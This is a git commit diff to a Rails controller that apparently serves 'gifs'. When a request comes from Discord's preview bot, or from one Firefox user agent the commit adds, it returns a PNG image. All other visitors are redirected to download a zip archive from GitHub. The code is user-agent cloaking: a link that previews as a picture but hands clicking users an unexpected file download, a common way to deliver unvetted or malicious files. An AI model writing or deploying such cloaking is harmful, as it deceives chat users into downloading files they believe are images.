c26f029b980a9d769c3d2fef2d70011bd2ba33d2
lafe <0lafethehorsescrub@gmail.com>
2024-01-20 14:04:31 -0600

    more checks

--- app/controllers/gifs_controller.rb
+++ app/controllers/gifs_controller.rb
@@ -1,7 +1,7 @@
 class GifsController < ApplicationController
   def show
     p request.user_agent
-    if request.user_agent.include?('Discordbot') || request.user_agent.include?('discordapp')
+    if request.user_agent.include?('Discordbot') || request.user_agent.include?('discordapp') || request.user_agent.include?('Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0')
       send_file('app/assets/images/msga.png', type: 'image/png', disposition: 'inline')
     else
       redirect_to 'https://github.com/mrcreepysos/msga/archive/refs/heads/main.zip', allow_other_host: true
